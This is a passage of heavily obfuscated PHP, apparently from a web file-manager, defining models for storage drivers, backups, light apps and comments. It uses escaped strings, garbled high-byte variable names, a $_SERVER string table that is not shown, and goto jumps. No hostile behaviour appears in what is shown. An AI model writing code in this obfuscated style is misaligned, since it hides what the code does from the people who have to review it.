array("\x6e\141\x6d\x65", "\163\151\x7a\x65\115\x61\x78", "\163\171\x73\x74\x65\155", "\144\x65\146\x61\x75\154\x74", "\x64\x72\151\x76\145\x72", "\x63\x6f\x6e\x66\151\x67"); public function listData($¿ÇÔù¤„ = false, $¡Š·ÕˆØ = "\155\157\x64\151\x66\171\x54\x69\155\x65", $÷Ç¼Î« = false) { $¤¤ÈÊ½ï =& $_SERVER[³½¬ÚË¯]; $ø±Ñä€ = parent::listData($¿ÇÔù¤„, $¡Š·ÕˆØ, $÷Ç¼Î«); if ($¿ÇÔù¤„) { return $ø±Ñä€; } $êŠÖ¶±­ = $this->ioSizeUseGet(array_to_keyvalue($ø±Ñä€, $¤¤ÈÊ½ï[12], $¤¤ÈÊ½ï[443])); foreach ($ø±Ñä€ as $›µ‹Ë– => $¨İ©³ç) { unset($ø±Ñä€[$›µ‹Ë–][$¤¤ÈÊ½ï[6]]); $ø±Ñä€[$›µ‹Ë–][$¤¤ÈÊ½ï[1877]] = isset($êŠÖ¶±­[$¨İ©³ç[$¤¤ÈÊ½ï[443]]]) ? $êŠÖ¶±­[$¨İ©³ç[$¤¤ÈÊ½ï[443]]] : 0; } return $ø±Ñä€; } public function ioSizeUseGet($±¤ˆÎüÆ) { $²®õÜõÖ =& $_SERVER[³½¬ÚË¯]; if (!$±¤ˆÎüÆ) { return array(); } $ÍŠ•ºŒ€ = $²®õÜõÖ[2208] . implode($²®õÜõÖ[50], $±¤ˆÎüÆ); $¿àÃ–˜Ö = Cache::get($ÍŠ•ºŒ€); if ($¿àÃ–˜Ö) { return $¿àÃ–˜Ö; } $Êôı¬œĞ = array($²®õÜõÖ[853] => $²®õÜõÖ[443], $²®õÜõÖ[2209] => $²®õÜõÖ[76]); $¼•ãŒ‰æ = array($²®õÜõÖ[853] => array($²®õÜõÖ[7], $±¤ˆÎüÆ)); $¿àÃ–˜Ö = Model($²®õÜõÖ[825])->field($Êôı¬œĞ)->where($¼•ãŒ‰æ)->group($²®õÜõÖ[853])->select(); $¿àÃ–˜Ö = array_to_keyvalue($¿àÃ–˜Ö, $²®õÜõÖ[443], $²®õÜõÖ[76]); Cache::set($ÍŠ•ºŒ€, $¿àÃ–˜Ö, 600); return $¿àÃ–˜Ö; } public function getConfig($¬”ĞêªÉ) { $ÑÃ§÷ = parent::listData($¬”ĞêªÉ); return json_decode($ÑÃ§÷[$_SERVER[³½¬ÚË¯][6]], !0); } public function update($· §÷óá, $´ºş¨Ñ) { $Š¦å²ìŸ =& $_SERVER[³½¬ÚË¯]; $áìŠúßß = $´ºş¨Ñ[$Š¦å²ìŸ[32]]; $¥…ÃêÍ = array_to_keyvalue(parent::listData(), $Š¦å²ìŸ[32]); if (isset($¥…ÃêÍ[$áìŠúßß]) && $¥…ÃêÍ[$áìŠúßß][$Š¦å²ìŸ[443]] != $· §÷óá) { return !1; } $this->checkPwd($· §÷óá, $´ºş¨Ñ); if (isset($´ºş¨Ñ[$Š¦å²ìŸ[2210]]) && $´ºş¨Ñ[$Š¦å²ìŸ[2210]] == $Š¦å²ìŸ[88]) { $this->checkConfig($´ºş¨Ñ); } unset($´ºş¨Ñ[$Š¦å²ìŸ[2210]]); $¤†Şû™ = parent::update($· §÷óá, $´ºş¨Ñ); if ($¤†Şû™ && $´ºş¨Ñ[$Š¦å²ìŸ[37]]) { $Ó®Å‘Öæ = 0; foreach ($¥…ÃêÍ as $Û‹½Şîº) { if ($Û‹½Şîº[$Š¦å²ìŸ[37]] && $Û‹½Şîº[$Š¦å²ìŸ[443]] != $· §÷óá) { $Ó®Å‘Öæ = $Û‹½Şîº[$Š¦å²ìŸ[443]]; parent::update($Û‹½Şîº[$Š¦å²ìŸ[443]], array($Š¦å²ìŸ[37] => 0)); } } $this->updateBackup($· §÷óá, $Ó®Å‘Öæ); } return $¤†Şû™; } public function add($¦³¿Ë–) { $©İÃ‚¼ü =& $_SERVER[³½¬ÚË¯]; $ïõÈ¼İ = array_to_keyvalue(parent::listData(), $©İÃ‚¼ü[32]); if (isset($ïõÈ¼İ[$¦³¿Ë–[$©İÃ‚¼ü[32]]])) { return !1; } $this->checkConfig($¦³¿Ë–); $Ï…ÁÛ»™ = parent::insert($¦³¿Ë–); if ($Ï…ÁÛ»™ && $¦³¿Ë–[$©İÃ‚¼ü[37]]) { foreach ($ïõÈ¼İ as $Ê‡Û®) { if ($Ê‡Û®[$©İÃ‚¼ü[37]]) { parent::update($Ê‡Û®[$©İÃ‚¼ü[443]], array($©İÃ‚¼ü[37] => 0)); } } } return $Ï…ÁÛ»™; } public function updateBackup($Ş¢¢Ì‘, $´è¾¤ã¥) { $ºÜ™æ‹“ =& $_SERVER[³½¬ÚË¯]; if (!$´è¾¤ã¥) { return; } $Äñô¸½î = Model($ºÜ™æ‹“[785])->config(); if ($Äñô¸½î[$ºÜ™æ‹“[1660]] != $ºÜ™æ‹“[88] || $Äñô¸½î[$ºÜ™æ‹“[787]] != $´è¾¤ã¥) { return; } $ô¦¥óçÖ = Model($ºÜ™æ‹“[806])->get($ºÜ™æ‹“[816]); $ô¦¥óçÖ = json_decode($ô¦¥óçÖ, !0); if (!$ô¦¥óçÖ) { return; } $ô¦¥óçÖ[$ºÜ™æ‹“[787]] = $Ş¢¢Ì‘; Model($ºÜ™æ‹“[806])->set(array($ºÜ™æ‹“[816] => $ô¦¥óçÖ)); } public function checkPwd($²ı££èì, &$†»›æÙ) { $–éÈ²ä† =& $_SERVER[³½¬ÚË¯]; if (empty($†»›æÙ[$–éÈ²ä†[6]])) { return; } $¼÷ÂàÔŒ = json_decode($†»›æÙ[$–éÈ²ä†[6]], !0); $ı™ø…Éµ = $–éÈ²ä†[12]; $Øß²¥°® = array($–éÈ²ä†[2211], $–éÈ²ä†[2212], $–éÈ²ä†[932]); foreach ($Øß²¥°® as $ÂÂèÛ³) { if (isset($¼÷ÂàÔŒ[$ÂÂèÛ³])) { $ı™ø…Éµ = $ÂÂèÛ³; break; } } if (!$ı™ø…Éµ) { return; } $¤ƒ²ºÙ = $this->getConfig($²ı££èì); $Ü÷†ä‘Ö = $¤ƒ²ºÙ[$ı™ø…Éµ]; $çŠšß¿ = $¼÷ÂàÔŒ[$ı™ø…Éµ]; if ($çŠšß¿ == str_repeat($–éÈ²ä†[203], strlen($Ü÷†ä‘Ö))) { $¼÷ÂàÔŒ[$ı™ø…Éµ] = $Ü÷†ä‘Ö; $†»›æÙ[$–éÈ²ä†[6]] = json_encode($¼÷ÂàÔŒ); } else { if ($çŠšß¿ != $Ü÷†ä‘Ö) { $†»›æÙ[$–éÈ²ä†[2210]] = $–éÈ²ä†[88]; } } } public function checkConfig(&$ÉÁÖÑ¥, $—ºœäó = false) { $Õ†á³Øê =& $_SERVER[³½¬ÚË¯]; $ğÄª™ÀÜ = strtolower($ÉÁÖÑ¥[$Õ†á³Øê[95]]); $èè‹æä = json_decode($ÉÁÖÑ¥[$Õ†á³Øê[6]], !0); foreach ($èè‹æä as $œ£Ñ“ÕØ => $‘Ê±ÔÄ®) { if (is_string($‘Ê±ÔÄ®)) { $èè‹æä[$œ£Ñ“ÕØ] = trim($‘Ê±ÔÄ®); } } $èè‹æä[$Õ†á³Øê[2213]] = rand_string(6); $õ«·«ç„ = $GLOBALS[$Õ†á³Øê[6]][$Õ†á³Øê[89]][$Õ†á³Øê[862]]; $šŒï®Ç¤ = isset($õ«·«ç„[$ğÄª™ÀÜ]) ? $õ«·«ç„[$ğÄª™ÀÜ] : ucfirst($ğÄª™ÀÜ); $©…­¶“í = $Õ†á³Øê[74] . $šŒï®Ç¤; if (!$šŒï®Ç¤ || !class_exists($©…­¶“í)) { if ($—ºœäó) { return LNG($Õ†á³Øê[2214]); } write_log(array($Õ†á³Øê[2215], $ÉÁÖÑ¥, get_caller_info()), $Õ†á³Øê[2216]); show_json(LNG($Õ†á³Øê[2214]), !1, $ÉÁÖÑ¥); } $¼í­­ˆø = new $©…­¶“í($èè‹æä); if (in_array($ğÄª™ÀÜ, $¼í­­ˆø->objectDriver)) { if (!$¼í­­ˆø->isBucketCors() && !$¼í­­ˆø->setBucketCors()) { $Æ®ŞÌß÷ = LNG($Õ†á³Øê[2217]); $Æ®ŞÌß÷ .= $Õ†á³Øê[2218] . LNG($Õ†á³Øê[2219]); if ($—ºœäó) { return $Æ®ŞÌß÷; } show_json($Æ®ŞÌß÷, !1); } } $ùÃ³¼Ä = rtrim($èè‹æä[$Õ†á³Øê[1223]], $Õ†á³Øê[8]) . $Õ†á³Øê[8]; $±÷° ÜÁ = $¼í­­ˆø->getPath($ùÃ³¼Ä . $Õ†á³Øê[1227]); if (!$¼í­­ˆø->mkfile($±÷° ÜÁ)) { if ($—ºœäó) { return LNG($Õ†á³Øê[2217]); } show_json(LNG($Õ†á³Øê[2217]), !1); } $èè‹æä[$Õ†á³Øê[1223]] = $ùÃ³¼Ä; $ÉÁÖÑ¥[$Õ†á³Øê[6]] = json_encode($èè‹æä); $ÉÁÖÑ¥[$Õ†á³Øê[95]] = $šŒï®Ç¤; return !0; } public function driverListSystem() { $±ñÖ›Õ² =& $_SERVER[³½¬ÚË¯]; $Üü‡ƒ¶š = parent::listData(); $×ã­‚ÍÏ = array(); foreach ($Üü‡ƒ¶š as $µõÌáÎ) { unset($µõÌáÎ[$±ñÖ›Õ²[215]], $µõÌáÎ[$±ñÖ›Õ²[85]]); $µõÌáÎ[$±ñÖ›Õ²[6]] = json_decode($µõÌáÎ[$±ñÖ›Õ²[6]], !0); $×ã­‚ÍÏ[] = $µõÌáÎ; } return $×ã­‚ÍÏ; } public function defaultDriver() { $•÷ªÕ¬¤ =& $_SERVER[³½¬ÚË¯]; $Õ©ëôÃ = parent::listData(); $”ã¨æ‰á = array_filter_by_field($Õ©ëôÃ, $•÷ªÕ¬¤[37], 1); $”ã¨æ‰á = $”ã¨æ‰á[0]; if ($”ã¨æ‰á) { $”ã¨æ‰á[$•÷ªÕ¬¤[6]] = json_decode($”ã¨æ‰á[$•÷ªÕ¬¤[6]], !0); } return $”ã¨æ‰á; } public function driverInfo($ış­) { $Â±ôš¶Ş =& $_SERVER[³½¬ÚË¯]; $İ±ôš½Ÿ = array_to_keyvalue(parent::listData(), $Â±ôš¶Ş[443]); if (!isset($İ±ôš½Ÿ[$ış­])) { return !1; } $°Ö‚ùºÂ = $İ±ôš½Ÿ[$ış­]; $°Ö‚ùºÂ[$Â±ôš¶Ş[6]] = json_decode($°Ö‚ùºÂ[$Â±ôš¶Ş[6]], !0); return $°Ö‚ùºÂ; } public function remove($â°Ü†) { $this->removeShareItems($â°Ü†); return parent::remove($â°Ü†); } public function removeWithFile($ØÙ‹È¾Ú, $¯²“Á) { $¾ÉùĞ‚ö =& $_SERVER[³½¬ÚË¯]; $ÆâŸÒİô = array($¾ÉùĞ‚ö[853] => $ØÙ‹È¾Ú); $²ª×Õ¼ = Model($¾ÉùĞ‚ö[512])->where($ÆâŸÒİô)->count(); $àæÃ”¶ = Model($¾ÉùĞ‚ö[512])->where($ÆâŸÒİô)->sum($¾ÉùĞ‚ö[76]); $ıÁö¥¡¨ = $¯²“Á . $¾ÉùĞ‚ö[2220] . $ØÙ‹È¾Ú; $ÍŞˆÀñØ = LNG($¯²“Á == $¾ÉùĞ‚ö[589] ? $¾ÉùĞ‚ö[2221] : $¾ÉùĞ‚ö[2222]); $ôõ¦Ã×æ = new TaskFileTransfer($ıÁö¥¡¨, $¾ÉùĞ‚ö[2216], $²ª×Õ¼, $ÍŞˆÀñØ . "\50{$ØÙ‹È¾Ú}\51"); $ôõ¦Ã×æ->task[$¾ÉùĞ‚ö[799]] = (double) $àæÃ”¶; $ö‰€“§ = KodIO::defaultDriver(); $´¤şã£ú = $ö‰€“§[$¾ÉùĞ‚ö[443]]; $ç›à„±· = "\173\x69\x6f\x3a{$´¤şã£ú}\x7d\x2f"; $ÅğÛ–ñ¼ = !0; $øàºØâ = array(); $ºÃüé¢ = Model($¾ÉùĞ‚ö[214])->where($ÆâŸÒİô)->field($¾ÉùĞ‚ö[2223])->select(); foreach ($ºÃüé¢ as $²Ûè£Î) { $şàŒ‡áÏ = $²Ûè£Î[$¾ÉùĞ‚ö[84]]; $Ó€ş‡š = $ç›à„±· . str_replace("\x7b\x69\157\72{$ØÙ‹È¾Ú}\175\57", $¾ÉùĞ‚ö[12], $şàŒ‡áÏ); if (!IO::exist($şàŒ‡áÏ)) { $øàºØâ[] = $²Ûè£Î[$¾ÉùĞ‚ö[509]]; $ôõ¦Ã×æ->updateFileEnd($²Ûè£Î[$¾ÉùĞ‚ö[32]], $²Ûè£Î[$¾ÉùĞ‚ö[76]]); continue; } if (IO::exist($Ó€ş‡š)) { $ôõ¦Ã×æ->updateFileEnd($²Ûè£Î[$¾ÉùĞ‚ö[32]], $²Ûè£Î[$¾ÉùĞ‚ö[76]]); continue; } if (!IO::move($şàŒ‡áÏ, get_path_father($Ó€ş‡š))) { $ÅğÛ–ñ¼ = !1; break; } $ÆâŸÒİô = array($¾ÉùĞ‚ö[509] => $²Ûè£Î[$¾ÉùĞ‚ö[509]]); $€¥ÙÉ´Œ = array($¾ÉùĞ‚ö[853] => $´¤şã£ú, $¾ÉùĞ‚ö[84] => $Ó€ş‡š); Model($¾ÉùĞ‚ö[214])->where($ÆâŸÒİô)->save($€¥ÙÉ´Œ); } $this->removeByFileID($øàºØâ); if (!$ÅğÛ–ñ¼) { $ôõ¦Ã×æ->stop($ıÁö¥¡¨); return !1; } $ôõ¦Ã×æ->end(); if ($¯²“Á == $¾ÉùĞ‚ö[1857]) { $this->remove($ØÙ‹È¾Ú); } } public function progress($ñÁ™‹ÕÀ, $Á™É¸Ô) { return Task::get($Á™É¸Ô . $_SERVER[³½¬ÚË¯][2220] . $ñÁ™‹ÕÀ); } private function removeByFileID($úòÄ‰„è = array()) { $È²³›¥Ç =& $_SERVER[³½¬ÚË¯]; if (empty($úòÄ‰„è)) { return; } $ÕîÏˆÏ = array($È²³›¥Ç[509] => array($È²³›¥Ç[7], $úòÄ‰„è)); $šç»©›° = Model($È²³›¥Ç[1375])->where($ÕîÏˆÏ)->field($È²³›¥Ç[181])->select(); if (!$šç»©›°) { return; } $šç»©›° = array_to_keyvalue($šç»©›°, $È²³›¥Ç[12], $È²³›¥Ç[181]); foreach ($šç»©›° as $â®ÌìÃ) { Model($È²³›¥Ç[458])->removeNow($â®ÌìÃ, !1); } } private function removeShareItems($–µ£ßú) { $Æ¥ˆóŒò =& $_SERVER[³½¬ÚË¯]; $ÎîÅàòç = "\x7b\x69\157\72{$–µ£ßú}\175\57"; $ñ—’‰Ç‘ = array($Æ¥ˆóŒò[181] => 0, $Æ¥ˆóŒò[1218] => array($Æ¥ˆóŒò[427], "{$ÎîÅàòç}\45")); $ˆ„Ôš¶ù = Model($Æ¥ˆóŒò[1868])->where($ñ—’‰Ç‘)->field($Æ¥ˆóŒò[634])->select(); if (empty($ˆ„Ôš¶ù)) { return; } $­ÚŠœÈØ = array_to_keyvalue($ˆ„Ôš¶ù, $Æ¥ˆóŒò[12], $Æ¥ˆóŒò[634]); Model($Æ¥ˆóŒò[633])->remove($­ÚŠœÈØ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\56\114\151\147\x68\x74\x41\x70\160"; public $modelType = "\x53\x79\x73\x74\x65\155\117\x70\x74\151\157\x6e"; public $field = array("\x6e\141\155\x65", "\147\x72\157\165\160", "\x64\145\163\x63", "\143\x6f\156\164\x65\156\x74"); public function listData($œì¶ê = false, $Î‚®Ş¸” = "\x6d\x6f\144\151\x66\x79\x54\151\155\x65", $±êìğ¬ü = true) { return parent::listData($œì¶ê, $Î‚®Ş¸”, $±êìğ¬ü); } public function remove($ŞÏ©Ï”Û) { $ã–õˆĞó = $this->findByName($ŞÏ©Ï”Û); if (!$ã–õˆĞó) { return !1; } return parent::remove($ã–õˆĞó[$_SERVER[³½¬ÚË¯][443]]); } public function add($×¾¨›åÊ) { if ($this->findByName($×¾¨›åÊ[$_SERVER[³½¬ÚË¯][32]])) { return !1; } return parent::insert($×¾¨›åÊ); } public function update($ª·€úõ£, $†«“´„í) { $èÒ¿ĞÎ¼ =& $_SERVER[³½¬ÚË¯]; $òéï‚Í³ = $this->findByName($ª·€úõ£); $¤°ë¯æ¼ = $this->findByName($†«“´„í[$èÒ¿ĞÎ¼[32]]); if (!$òéï‚Í³ || $¤°ë¯æ¼ && $¤°ë¯æ¼[$èÒ¿ĞÎ¼[443]] != $òéï‚Í³[$èÒ¿ĞÎ¼[443]]) { return !1; } return parent::update($òéï‚Í³[$èÒ¿ĞÎ¼[443]], $†«“´„í); } } goto D±ˆØ„ßâÊ; AáÑêäÃØ: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\142\141\143\153\x75\x70\x4c\151\163\x74"; public $field = array("\x69\157", "\156\141\155\x65", "\163\x74\141\x74\x75\163", "\143\157\156\x74\x65\156\164", "\x6d\141\156\165\141\154", "\x72\x65\x73\x75\x6c\x74", "\x74\x69\155\x65\x46\x72\157\x6d", "\x74\151\155\145\124\157"); public function config() { $¸ˆÅ­„• =& $_SERVER[³½¬ÚË¯]; $Ó†®“ÛÔ = Model($¸ˆÅ­„•[806])->get($¸ˆÅ­„•[816]); $Ó†®“ÛÔ = json_decode($Ó†®“ÛÔ, !0); $Ó†®“ÛÔ = is_array($Ó†®“ÛÔ) ? $Ó†®“ÛÔ : array(); if (!isset($Ó†®“ÛÔ[$¸ˆÅ­„•[790]])) { $Ó†®“ÛÔ[$¸ˆÅ­„•[790]] = $¸ˆÅ­„•[88]; } unset($Ó†®“ÛÔ[$¸ˆÅ­„•[1660]]); Action($¸ˆÅ­„•[1913])->taskInit(); Model($¸ˆÅ­„•[1659])->cacheClear(); $¨‚„çì = $¸ˆÅ­„•[1914]; $¤¤ÔÃ¬º = Model($¸ˆÅ­„•[1915])->findByKey($¸ˆÅ­„•[1678], $¨‚„çì); if (!$¤¤ÔÃ¬º) { $¤¤ÔÃ¬º = array(); } if (isset($¤¤ÔÃ¬º[$¸ˆÅ­„•[194]])) { $¤¤ÔÃ¬º[$¸ˆÅ­„•[194]] = json_decode($¤¤ÔÃ¬º[$¸ˆÅ­„•[194]], !0); } if (isset($Ó†®“ÛÔ[$¸ˆÅ­„•[194]])) { $¤¤ÔÃ¬º[$¸ˆÅ­„•[194]][$¸ˆÅ­„•[1663]] = $Ó†®“ÛÔ[$¸ˆÅ­„•[194]]; unset($Ó†®“ÛÔ[$¸ˆÅ­„•[194]]); } return array_merge($¤¤ÔÃ¬º, $Ó†®“ÛÔ); } public function listData($›Âà±Â½ = false, $Êòñ²ÏŠ = "\x6d\x6f\144\151\x66\x79\124\x69\x6d\x65", $ú—ƒ Ó¥ = false) { return parent::listData($›Âà±Â½, $Êòñ²ÏŠ, !0); } public function lastItem() { $¡‚¶êõ = $this->listData(); return !empty($¡‚¶êõ[0]) ? $¡‚¶êõ[0] : null; } public function kill($ÀÁíöªÑ) { $È¢µ¨‡ˆ =& $_SERVER[³½¬ÚË¯]; $£¡âº = $this->listData($ÀÁíöªÑ); if (!$£¡âº || empty($£¡âº[$È¢µ¨‡ˆ[32]])) { return !0; } Task::kill($È¢µ¨‡ˆ[815]); Task::kill($È¢µ¨‡ˆ[836]); Task::kill($È¢µ¨‡ˆ[845]); $ Ì¥±Ù = $£¡âº[$È¢µ¨‡ˆ[32]]; $ÆÆöÛÕá = TEMP_FILES . $È¢µ¨‡ˆ[814] . $ Ì¥±Ù . $È¢µ¨‡ˆ[8]; IO::remove($ÆÆöÛÕá, !1); return $this->remove($ÀÁíöªÑ); } public function remove($Âîç¹›) { $Í °¨½£ = $this->listData($Âîç¹›); if (!$Í °¨½£) { return !0; } return $this->backupRemove($Í °¨½£); } private function backupRemove($ÁÒÌô££) { parent::remove($ÁÒÌô££[$_SERVER[³½¬ÚË¯][443]]); $œ‡ÄæÄ„ = $this->backupPath($ÁÒÌô££); IO::remove($œ‡ÄæÄ„, !1); return !0; } private function backupPath($ø©²¯€Ì) { $šºÉğÉÀ =& $_SERVER[³½¬ÚË¯]; $ôãÛäÒÅ = $ø©²¯€Ì[$šºÉğÉÀ[32]]; $”²ôÅ˜€ = Model($šºÉğÉÀ[806])->get($šºÉğÉÀ[807]); $Œ½Û£óØ = substr(md5($šºÉğÉÀ[808] . $”²ôÅ˜€ . $ôãÛäÒÅ), 0, 8); return "\x7b\x69\157\x3a{$ø©²¯€Ì[$šºÉğÉÀ[787]]}\175\x2f\144\141\x74\141\142\141\x73\x65\x2f\142\141\143\153\165\160\57" . $ôãÛäÒÅ . $šºÉğÉÀ[11] . $Œ½Û£óØ; } public function start() { $ıÙ»´şß =& $_SERVER[³½¬ÚË¯]; if ($GLOBALS[$ıÙ»´şß[6]][$ıÙ»´şß[89]][$ıÙ»´şß[1916]] != $ıÙ»´şß[88]) { return !0; } $ª«¦ôÁ = $this->config(); if (!$ª«¦ôÁ || $ª«¦ôÁ[$ıÙ»´şß[1660]] != $ıÙ»´şß[88]) { return !1; } $Ú®ó€Îî = $this->process(); foreach ($Ú®ó€Îî as $Û÷•İ¦…) { if ($Û÷•İ¦…) { return Task::restart($Û÷•İ¦…[$ıÙ»´şß[443]]); } } $†‚¢­šÏ = new Backup(); $ÍôÔæ’† = $†‚¢­šÏ->db(); if ($ÍôÔæ’†) { $ÍôÔæ’† = $†‚¢­šÏ->dbFile(); if ($ÍôÔæ’† && $ª«¦ôÁ[$ıÙ»´şß[790]] == $ıÙ»´şß[212]) { $ÍôÔæ’† = $†‚¢­šÏ->file(); } } Backup::set(array($ıÙ»´şß[786] => 1, $ıÙ»´şß[797] => time())); return !0; } public function process() { $–µ„·Ê× =& $_SERVER[³½¬ÚË¯]; $€¾†××Š = array($–µ„·Ê×[793] => Task::get($–µ„·Ê×[815]), $–µ„·Ê×[798] => Task::get($–µ„·Ê×[836]), $–µ„·Ê×[214] => Task::get($–µ„·Ê×[845])); $½’®—÷Ú = !1; foreach ($€¾†××Š as &$ªÈ·Ç®¸) { if ($½’®—÷Ú) { $ªÈ·Ç®¸ = !1; continue; } if ($ªÈ·Ç®¸) { $ÀÎºş™ = intval(_get($ªÈ·Ç®¸, $–µ„·Ê×[1695], 0)); if (time() - $ÀÎºş™ > 7200) { Task::kill($ªÈ·Ç®¸[$–µ„·Ê×[443]]); $½’®—÷Ú = !0; $ªÈ·Ç®¸ = !1; } } } return $€¾†××Š; } public function restore() { $µÉ‰Ï¤ü =& $_SERVER[³½¬ÚË¯]; ActionCall($µÉ‰Ï¤ü[1103], !0, 1); ActionCall($µÉ‰Ï¤ü[1103], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\145\x6e\x74"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\141\155\145" => "\x63\157\x6d\x6d\x65\156\x74\137\x6d\x65\164\141", "\x6d\145\x74\x61\106\151\145\x6c\144" => "\143\157\x6d\155\x65\x6e\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ÌîïÔŸ¶) { $‡¸‡Öš¯ =& $_SERVER[³½¬ÚË¯]; if ($ÌîïÔŸ¶[$‡¸‡Öš¯[1917]]) { $š¶ÂîÖè = $this->where(array($‡¸‡Öš¯[1918] => $ÌîïÔŸ¶[$‡¸‡Öš¯[1917]]))->find(); if (!$š¶ÂîÖè || $š¶ÂîÖè[$‡¸‡Öš¯[178]] != $ÌîïÔŸ¶[$‡¸‡Öš¯[178]] || $š¶ÂîÖè[$‡¸‡Öš¯[539]] != $ÌîïÔŸ¶[$‡¸‡Öš¯[539]]) { return !1; } $this->where(array($‡¸‡Öš¯[1918] => $ÌîïÔŸ¶[$‡¸‡Öš¯[1917]]))->setAdd($‡¸‡Öš¯[1919], 1); } $ÌîïÔŸ¶[$‡¸‡Öš¯[1920]] = 0; $ÌîïÔŸ¶[$‡¸‡Öš¯[1919]] = 0; $ÌîïÔŸ¶[$‡¸‡Öš¯[786]] = 1; return $this->add($ÌîïÔŸ¶); } public function commentCount($ÈÑâÍš±, $ôÇŞªÎÄ, $ü·¦åÃ“ = false) { $‰Ú•½‡× =& $_SERVER[³½¬ÚË¯]; if (!$ÈÑâÍš±) { return array(); } if (is_string($ÈÑâÍš±) || is_int($ÈÑâÍš±)) { $ÈÑâÍš± = array($ÈÑâÍš±); } $¯Úªâ = array($‰Ú•½‡×[539], $‰Ú•½‡×[1921] => $‰Ú•½‡×[534]); $‡Œ•¬õş = array($‰Ú•½‡×[539] => array($‰Ú•½‡×[7], $ÈÑâÍš±), $‰Ú•½‡×[178] => $ôÇŞªÎÄ); if ($ü·¦åÃ“) { $‡Œ•¬õş[$‰Ú•½‡×[1690]] = $ü·¦åÃ“; } $¨‹Êâ²¤ = $this->field($¯Úªâ)->where($‡Œ•¬õş)->group($‰Ú•½‡×[539])->select(); return array_to_keyvalue($¨‹Êâ²¤, $‰Ú•½‡×[539], $‰Ú•½‡×[534]); } public function starTarget($ƒØÁ°”Ğ, $š Œ½Ú) { $ïÛÆø‘ =& $_SERVER[³½¬ÚË¯]; $ËÆé©„ = $ƒØÁ°”Ğ + self::TYPE_STAR_OFFSET; $ÜœëÛ = array($ïÛÆø‘[1690] => USER_ID, $ïÛÆø‘[178] => $ËÆé©„, $ïÛÆø‘[539] => $š Œ½Ú); $À¢ƒÎ˜ = $this->where($ÜœëÛ)->find(); if ($À¢ƒÎ˜) { return $this->where(array($ïÛÆø‘[443] => $À¢ƒÎ˜[$ïÛÆø‘[443]]))->delete(); } $ü™›‹â¢ = array($ïÛÆø‘[1917] => 0, $ïÛÆø‘[1690] => USER_ID, $ïÛÆø‘[786] => 1, $ïÛÆø‘[790] => $ïÛÆø‘[12], $ïÛÆø‘[178] => $ËÆé©„, $ïÛÆø‘[539] => $š Œ½Ú, $ïÛÆø‘[1920] => 0, $ïÛÆø‘[1919] => 0); return $this->add($ü™›‹â¢); } public function starTargetCount($ã½ôÍ°, $´¡Î´É) { $ãşÌ˜ŸÚ =& $_SERVER[³½¬ÚË¯]; $éëí”°± = $´¡Î´É + self::TYPE_STAR_OFFSET; $«Œ…Õé« = $this->commentCount($ã½ôÍ°, $éëí”°±); $¦Èğ‚Øó = $this->commentCount($ã½ôÍ°, $éëí”°±, USER_ID); return array($ãşÌ˜ŸÚ[1922] => $«Œ…Õé«, $ãşÌ˜ŸÚ[1923] => $¦Èğ‚Øó); } public function starTargetUserList($Á²¥Š—û, $Ñ•í¬õì) { $‰êÃœÂ =& $_SERVER[³½¬ÚË¯]; $äÒï¾ Ÿ = $Á²¥Š—û + self::TYPE_STAR_OFFSET; $®Áé¬ÂÄ = array($‰êÃœÂ[539] => $Ñ•í¬õì, $‰êÃœÂ[178] => $äÒï¾ Ÿ); $¢×€ğ´£ = $this->where($®Áé¬ÂÄ)->count(); $Æ­ğúİ = array($‰êÃœÂ[299] => $¢×€ğ´£, $‰êÃœÂ[1924] => array()); if (!$¢×€ğ´£) { return $Æ­ğúİ; } $€¥Øú‡ë = $this->field($‰êÃœÂ[1690])->where($®Áé¬ÂÄ)->limit(500)->select(); $€¥Øú‡ë = array_to_keyvalue($€¥Øú‡ë, $‰êÃœÂ[12], $‰êÃœÂ[1690]); $Æ­ğúİ[$‰êÃœÂ[1924]] = Model($‰êÃœÂ[547])->userListInfo($€¥Øú‡ë); return $Æ­ğúİ; } public function prasiseUserList($×ç»Òƒ›) { $´«é½ú‡ =& $_SERVER[³½¬ÚË¯]; $ÒÅú´¬ = array($´«é½ú‡[1925] => $×ç»Òƒ›); $»ê  Ø» = $this->where($ÒÅú´¬)->find(); $ì¡¾¨™¬ = _get($»ê  Ø», $´«é½ú‡[1920], 0); $È†“ê™® = array($´«é½ú‡[299] => $ì¡¾¨™¬, $´«é½ú‡[1924] => array()); if (!$ì¡¾¨™¬) { return $È†“ê™®; } $ã÷ıâ®í = Model($´«é½ú‡[1926])->field($´«é½ú‡[1690])->where($ÒÅú´¬)->limit(500)->select(); $ã÷ıâ®í = array_to_keyvalue($ã÷ıâ®í, $´«é½ú‡[12], $´«é½ú‡[1690]); $È†“ê™®[$´«é½ú‡[1924]] = Model($´«é½ú‡[547])->userListInfo($ã÷ıâ®í); return $È†“ê™®; } public function remove($­Ä“éÔ) { $¤…äî¥÷ =& $_SERVER[³½¬ÚË¯]; $ÁïŒ¡¥ = array($¤…äî¥÷[1918] => $­Ä“éÔ); $ıÚİİŒ = $this->where($ÁïŒ¡¥)->find(); if ($ıÚİİŒ[$¤…äî¥÷[1917]]) { $this->where(array($¤…äî¥÷[1918] => $ıÚİİŒ[$¤…äî¥÷[1917]]))->setAdd($¤…äî¥÷[1919], -1); } return $this->where($ÁïŒ¡¥)->delete(); } public function edit($áÅ¬ğ×, $Œ°éàğ£) { $ãÍÀîïÑ =& $_SERVER[³½¬ÚË¯]; $àÚÉÔ¢° = array($ãÍÀîïÑ[1918] => $áÅ¬ğ×); return $this->where($àÚÉÔ¢°)->save(array($ãÍÀîïÑ[1927] => $Œ°éàğ£)); } public function prasise($ëÜ©ÌÉ¿) { $Â÷ú§éœ =& $_SERVER[³½¬ÚË¯]; $¡êèóŞö = Model($Â÷ú§éœ[1928]); $Õ¢á§¥ = array($Â÷ú§éœ[1918] => $ëÜ©ÌÉ¿, $Â÷ú§éœ[1681] => USER_ID); $È¥˜¦ûù = $¡êèóŞö->where($Õ¢á§¥)->find(); if (!$È¥˜¦ûù) { 